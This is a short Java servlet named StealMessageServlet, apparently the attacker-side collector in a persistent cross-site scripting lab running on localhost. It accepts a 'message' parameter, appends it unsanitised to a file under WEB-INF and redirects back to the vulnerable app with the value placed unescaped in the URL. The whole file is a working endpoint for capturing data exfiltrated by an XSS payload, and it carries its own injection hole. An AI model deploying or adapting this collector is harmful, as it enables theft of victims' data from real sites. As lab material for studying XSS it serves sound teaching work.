package stealMessage;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.io.PrintWriter;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

public class StealMessageServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        
        String message = request.getParameter("message");
        String file = getServletContext().getRealPath("/WEB-INF/") + "/messages.txt";
        PrintWriter fout = new PrintWriter(
                new BufferedWriter(
                        new FileWriter(file, true)));
        fout.print(message);
        fout.close();
        
        response.sendRedirect("http://localhost:8084/PersistentXSS/home?message=" + message);
    }
}
